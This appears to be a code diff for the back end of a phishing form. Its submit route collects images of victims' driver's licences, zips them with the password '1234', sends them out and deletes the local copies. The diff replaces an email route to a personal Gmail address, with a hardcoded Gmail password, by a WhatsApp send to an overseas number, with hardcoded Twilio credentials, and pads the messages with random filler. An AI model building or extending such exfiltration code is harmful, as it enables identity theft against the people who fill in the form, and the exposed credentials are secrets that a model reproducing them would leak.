@@ -3,10 +3,10 @@ const app = express();
 const fs = require("fs");
 const path = require("path");
 const bodyParser = require("body-parser");
-const nodemailer = require("nodemailer");
 const multer = require("multer");
 const zipFolder = require("zip-a-folder");
 const compromise = require("compromise");
+const twilio = require("twilio");
 
 // Generate a random sentence for the email body
 const randomSentence = compromise("i").random().sentences(1).out();
@@ -63,34 +63,18 @@ app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
     const password = "1234";
     await zipFolder.zip(folderName, zipFileName, password);
 
-    // create nodemailer transport object
-    const transporter = nodemailer.createTransport({
-      host: "smtp.gmail.com",
-      port: 465,
-      secure: true,
-      auth: {
-        user: "tobir2275@gmail.com",
-        pass: "qteaicwtuuzthdbl",
-      },
+    // Twilio integration - create a Twilio client object
+    const client = twilio('ACe54e344198f142962f26f8dbbb56bcdc', 'd121c459858a2071e48667eddf9d2209');
+
+    // send message to recipient's WhatsApp
+    await client.messages.create({
+      from: 'whatsapp:+14155238886', // Twilio phone number
+      to: 'whatsapp:+2349154911424', // recipient's WhatsApp number
+      body: `${randomSentence}`,
+      mediaUrl: `https://your-server.com/${zipFileName}`,
     });
 
-    // create mail options object
-    const mailOptions = {
-      from: "tobir2275@gmail.com",
-      to: "habeebadaranijo541@gmail.com", // recipient email address
-      subject: `${randomSubject}`,
-      text: `${randomSentence}`,
-      attachments: [
-        {
-          filename: zipFileName,
-          path: zipFileName,
-        },
-      ],
-    };
-
-    // send mail with defined transport object
-    const info = await transporter.sendMail(mailOptions);
-    console.log("Email sent successfully.", info);
+    console.log("Message sent successfully.");
 
     // remove the folder and zip file
     fs.unlinkSync(zipFileName);
@@ -99,7 +83,7 @@ app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
     res.sendFile(path.join(__dirname, "confirmation.html"));
   } catch (err) {
     console.error(err);
-    res.status(500).send("Error sending email.");
+    res.status(500).send("Error sending message.");
   }
 });
 
